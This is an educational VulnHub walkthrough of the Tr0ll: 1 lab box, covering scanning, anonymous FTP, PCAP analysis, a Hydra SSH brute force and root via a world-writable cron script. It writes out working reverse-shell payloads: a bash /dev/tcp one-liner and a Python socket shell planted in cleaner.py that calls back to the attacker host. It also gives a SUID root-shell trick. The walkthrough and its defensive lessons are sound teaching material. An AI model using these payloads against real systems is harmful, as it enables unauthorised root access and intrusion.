# Tr0ll: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students on an isolated lab network. **Only attack machines you own or are explicitly authorised to test.** This box deliberately trolls you — expect red herrings.

| Field | Value |
| --- | --- |
| **Machine** | Tr0ll: 1 |
| **Difficulty** | Easy / Beginner (boot2root) |
| **Author** | Maleus (@maleus21) |
| **Released** | 14 Aug 2014 |
| **VulnHub Entry** | [https://vulnhub.com/entry/tr0ll-1,100/](https://vulnhub.com/entry/tr0ll-1,100/) |
| **Download** | [https://vulnhub.com/entry/tr0ll-1,100/#download](https://vulnhub.com/entry/tr0ll-1,100/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Ubuntu Linux 14.04 (32-bit, kernel 3.13 — varies by build) |

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to spot an **anonymous FTP** server and pull files from it.
- How to analyse a **PCAP** (network capture) in Wireshark to recover hidden names and passwords.
- How "hints" deliberately hidden in a web server lead to a username wordlist and a password.
- How to use **Hydra** to test a small credential list against SSH (and why rate-limiting matters).
- How a **world-writable script owned by root and run by cron** gives you root.

> **Fair warning from the author:** "Not for the easily frustrated! There be trolls ahead!" You will get disconnected every few minutes — this is normal. Capture what you need quickly.

**Prerequisites:** Kali Linux, plus `wireshark`, `hydra`, and `ftp` installed. See `docs/LAB-SETUP.md` and `docs/TOOLS.md`.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated network.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** your Kali box is `192.168.56.10` on `192.168.56.0/24`, so the target shares the `192.168.56.` prefix.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   (Kali)
192.168.56.101  08:00:27:11:22:33   (target)
```

> **Why it works:** `arp-scan` sends ARP requests and lists every host that answers — no need for an open port.

**Target IP:** `192.168.56.101`

![finding the target](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```


> ### 📖 Concept — FTP, and why "anonymous" is the first thing to try
>
> **FTP** (port 21) predates modern authentication. It sends usernames, passwords and
> file contents in **cleartext**, and it has a built-in convention for public access:
> the account **`anonymous`**, traditionally with an email address (or nothing) as the
> password.
>
> ```bash
> ftp target                     # then: anonymous / (blank)
> curl -s ftp://anonymous:@target/
> wget -r ftp://anonymous:@target/          # mirror the whole tree
> nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
> ```
>
> Inside an FTP session: `ls`, `cd`, `binary` (**switch mode before downloading
> anything non-text** — ASCII mode corrupts binaries), `get`, `mget`, `put`, `recurse`.
>
> **Two things to check immediately.** First, is anonymous access *enabled*? Second, is
> it **writable** — does `put shell.php` succeed? A writable FTP root that overlaps
> the web document root is a web-shell upload with no exploitation required. Also look
> for `backup.zip`, `creds.txt`, `id_rsa`, `web.config` and any `notes.txt` — authors
> leave the next step in a file named something obvious.
>
> ProFTPD 1.3.3c specifically ships a **compile-time backdoor** (`telnet target 6200`
> gives root); check the exact version against Exploit-DB before assuming you need
> credentials.
>
> **Deep dive:** [CONCEPTS §9.5 — FTP](../../docs/CONCEPTS.md#95-ftp--port-21)

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

```bash
sudo nmap -sC -sV -p21,22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 0 0  8068 Aug 09 2014 lol.pcap [NSE: writeable]
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

> **How to read it:**
> - `-sC` runs Nmap's default scripts — here `ftp-anon` **already tells us anonymous FTP works** and that a `lol.pcap` file is present.
> - **21/ftp** — anonymous login allowed → grab files.
> - **22/ssh** — where we'll eventually log in.
> - **80/http** — Apache, our main puzzle surface.

![nmap service scan output](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Anonymous FTP → download the PCAP

```bash
ftp 192.168.56.101
```

```text
Name (192.168.56.101:kali): anonymous
Password:            <- just press Enter
230 Login successful.
ftp> ls
-rwxrwxrwx    1 0 0  8068 Aug 09 2014 lol.pcap
ftp> get lol.pcap
ftp> bye
```

> **Why it works:** `anonymous` is a built-in FTP account for public file drops. Here it hands out a network capture that contains clues.

### 3.2 Read the PCAP in Wireshark

```bash
wireshark lol.pcap &
```

In Wireshark, right-click a packet and choose **Follow → TCP Stream**, then step through each stream (`tcp.stream eq 0`, `eq 1`, …). Two contain the "secret":

```text
Stream 0:  ... secret_stuff.txt ...
Stream 1:  Well, well, well, aren't you just a clever little devil,
           you almost found the sup3rs3cr3tdirlol :-P
```

> **How to read it:** a PCAP records raw network traffic. Somebody transferred a note mentioning `secret_stuff.txt` and a directory called **`sup3rs3cr3tdirlol`**. (You can also shortcut this with `strings lol.pcap`.)

### 3.3 Follow the web trail

Try the leaked directory on the web server:

```bash
curl http://192.168.56.101/sup3rs3cr3tdirlol/
```

```text
Index of /sup3rs3cr3tdirlol
  roflmao
```

Download and inspect the `roflmao` binary:

```bash
wget http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
file roflmao
chmod +x roflmao && ./roflmao
```

```text
roflmao: ELF 32-bit LSB executable, Intel 80386, ...
Find address 0x0856BF to proceed
```

> **How to read it:** `file` tells us it's a Linux executable. Running it prints the hint **`0x0856BF`** — which, on this box, is another web path, not a memory address.

```bash
curl "http://192.168.56.101/0x0856BF/"
```

```text
Index of /0x0856BF
  good_luck/
  this_folder_contains_the_password/
```

Grab both files:

```bash
curl http://192.168.56.101/0x0856BF/good_luck/which_one_lol.txt
curl http://192.168.56.101/0x0856BF/this_folder_contains_the_password/Pass.txt
```

```text
which_one_lol.txt:
  male-us
  ps-aux
  felux
  Eagle11
  genphlux   <-- Definitely not this one
  usmc8892
  blawrg
  wytshadow
  vis1t0r
  overflow

Pass.txt:
  Good_job_:)
```

> **How to read it:** `which_one_lol.txt` is a **username list** with a fake "definitely not this one" troll. `Pass.txt` looks like a password (`Good_job_:)`), but the *real* password is the **filename itself**: `Pass.txt`. The winning pair is `overflow:Pass.txt`.

### 3.4 Brute force SSH with Hydra (small, slow list)

```bash
cat > users.txt <<'EOF'
male-us
ps-aux
felux
Eagle11
genphlux
usmc8892
blawrg
wytshadow
vis1t0r
overflow
EOF
printf 'Pass.txt\nGood_job_:)\n' > pass.txt
```


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)

```bash
hydra -L users.txt -P pass.txt ssh://192.168.56.101 -t 4 -V
```

```text
[22][ssh] host: 192.168.56.101   login: overflow   password: Pass.txt
```

> **How to read it:**
> - `-L` = username list, `-P` = password list, `-t 4` = only 4 parallel tries (the box **rate-limits and bans you** if you hammer it — that's the troll).
> - It found `overflow` / `Pass.txt`.

Log in:

```bash
ssh overflow@192.168.56.101
```

```text
overflow@192.168.56.101's password: Pass.txt
...
Could not chdir to home directory /home/overflow: No such file or directory
$ id
uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
```

> **Why it works:** the filename-as-password trick plus a real account = shell. Note the missing home directory and the fact that **you get kicked every ~5 minutes** (a cron job `/opt/lmao.py` logs you out on purpose).

![foothold via SSH as overflow](images/04-foothold.png)

> **Note:** Tr0ll has no `user.txt`; the goal is root's `proof.txt`, so continue to privesc.

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

### 4.1 Find world-writable files owned by root

```bash
find / -perm -o+w -type f 2>/dev/null | grep -v /proc
```

```text
/srv/ftp/lol.pcap
/var/tmp/cleaner.py.swp
/var/www/html/sup3rs3cr3tdirlol/roflmao
/var/log/cronlog
/lib/log/cleaner.py
```

> **How to read it:** `-perm -o+w` finds files that **everyone can write to**. A world-writable file **owned by root** is a backdoor waiting to happen. `/lib/log/cleaner.py` stands out.

### 4.2 Confirm it runs as root via cron

```bash
cat /lib/log/cleaner.py
cat /var/log/cronlog
ls -la /lib/log/cleaner.py
```

```text
# /lib/log/cleaner.py
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()

# /var/log/cronlog
*/2 * * * * cleaner.py

# -rwxrwxrwx 1 root root 96 Aug 13 2014 /lib/log/cleaner.py
```

> **How to read it:**
> - The script just deletes everything in `/tmp`.
> - `cronlog` shows it is scheduled every 2 minutes (`*/2`), and `-rwxrwxrwx 1 root root` shows **root owns it but everyone can write it**.
> - Therefore: whatever we put in `cleaner.py` runs **as root within ~2 minutes**.

### 4.3 Hijack the script

Overwrite `cleaner.py` with a reverse shell that calls back to Kali. First start a listener:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# On Kali — separate terminal
nc -lvnp 4444
```

```bash
# On the target — replace the cleanup script
cat > /lib/log/cleaner.py <<'EOF'
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.56.10",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
EOF
```

Wait up to 2 minutes. Back on your listener:

```text
listening on [any] 4444 ...
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 44BE
# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** cron executes `cleaner.py` as root; because we could write to it, our code ran as root. We now have a root shell.

> **Alternative (SUID shell):** instead of a reverse shell, make the script copy `/bin/sh` and set the SUID bit, then wait for cron:
> ```bash
> cat > /lib/log/cleaner.py <<'EOF'
> import os
> os.system('rm -f /tmp/rootsh; cp /bin/bash /tmp/rootsh; chmod 4755 /tmp/rootsh')
> EOF
> ```
> After ~2 minutes run `/tmp/rootsh -p` to get a root shell.

> **Also viable:** the old 3.13 kernel is vulnerable to OverlayFS (`CVE-2015-1328`) and Dirty COW (`CVE-2016-5195`) local privilege escalation, but the writable-cron path is the intended one.

### 4.4 The root flag

```bash
cd /root
ls -la
cat /root/proof.txt
```

```text
Good job, you did it! 702a8c18d29c6f3ca0d99ef5712bfbdc
```

![root flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous FTP enabled | `vsftpd` on port 21 | Attacker downloads internal files (`lol.pcap`) |
| 2 | Sensitive data in a network capture | `lol.pcap` | Leaks hidden directory names / hints |
| 3 | Directory listing + info disclosure | Apache `/sup3rs3cr3tdirlol/`, `/0x0856BF/` | Reveals hidden paths, username list and password |
| 4 | Weak/predictable credentials | SSH (`overflow:Pass.txt`) | Initial shell |
| 5 | World-writable root-owned script run by cron | `/lib/log/cleaner.py` (`*/2 * * * *`) | Local user runs arbitrary code as root |
| 6 | Unpatched kernel (bonus) | kernel 3.13 (OverlayFS / Dirty COW) | Alternative local root escalation |

---

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP** unless you truly need a public drop, and never store sensitive captures there.
- **Never leave sensitive data in plaintext on disk or in packet captures**; treat PCAPs as confidential.
- **Turn off Apache directory listings** (`Options -Indexes`) and don't place credential lists in the web root.
- **Enforce strong, unique passwords**; filenames and "cute" phrases are not passwords. Add SSH rate-limiting/lockouts.
- **Fix file permissions.** Root-owned scripts must not be world-writable (use `chmod 755` and root-only ownership). Prefer running cron jobs as an unprivileged service account.
- **Patch the kernel** so local priv-esc exploits (OverlayFS, Dirty COW) don't work.
- **Detections:** monitor for changes to files under `/etc/cron*`, `/var/spool/cron`, and any root-owned script; alert on unexpected outbound connections (reverse shells) and on processes with `euid=0` started from world-writable files.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: [https://vulnhub.com/entry/tr0ll-1,100/](https://vulnhub.com/entry/tr0ll-1,100/)
- Community writeups consulted:
  - [sw1tch — Walkthrough for Tr0ll: 1](https://www.sw1tch.net/20140816_01.html)
  - [NetOSec — Tr0ll 1 vulnhub walkthrough](https://netosec.com/tr0ll-1-vulnhub-walkthrough/)
  - [Ivan Daňo (Medium) — Tr0ll 1 Writeup](https://medium.com/@ivandano77/tr0ll-1-writeup-vulnhub-beginner-machine-877f118310f7)
  - [ziomsec — Troll 1 Writeup](https://ziomsec.com/writeups/vulnhub/troll-1/)
  - [dieSec — WriteUp Tr0ll 1](https://diesec.home.blog/2020/03/15/writeup-tr0ll-1/)
- Tool technique references:
  - [GTFOBins](https://gtfobins.github.io/)
  - [Exploit-DB 37292 — OverlayFS Local Privilege Escalation (CVE-2015-1328)](https://www.exploit-db.com/exploits/37292)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — port/service scan (21/22/80) with `ftp-anon`
- [ ] `images/03-enum.png` — the `0x0856BF` directory with username/password files
- [ ] `images/04-foothold.png` — Hydra + SSH login as `overflow`
- [ ] `images/05-shell.png` — the `overflow` shell
- [ ] `images/06-user-flag.png` — (no user flag on this box — note it)
- [ ] `images/07-privesc.png` — world-writable `/lib/log/cleaner.py` and cron
- [ ] `images/08-root-flag.png` — `/root/proof.txt`

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
